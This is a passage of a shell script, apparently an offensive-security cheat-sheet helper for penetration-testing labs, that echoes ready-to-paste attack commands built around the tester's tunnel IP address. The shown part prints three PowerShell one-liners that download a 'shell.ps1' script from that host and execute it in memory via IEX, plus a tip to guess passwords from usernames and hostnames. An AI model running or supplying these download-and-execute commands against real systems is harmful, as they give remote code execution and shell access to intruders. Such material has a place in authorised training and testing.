...
echo ""
echo "PowerShell Download & Execute:"
echo "iex (iwr '$TUN0IP/shell.ps1') # From PSv3"
echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$TUN0IP/shell.ps1')\""
echo ""
echo "PowerShell Download & Execute from CMD:"
echo "echo IEX(New-Object Net.WebClient).DownloadString('http://$TUN0IP/shell.ps1') | powershell -noprofile -"
echo ""
echo "-----------------------------------"
echo ""
echo "Try usernames/hostname as passwords"
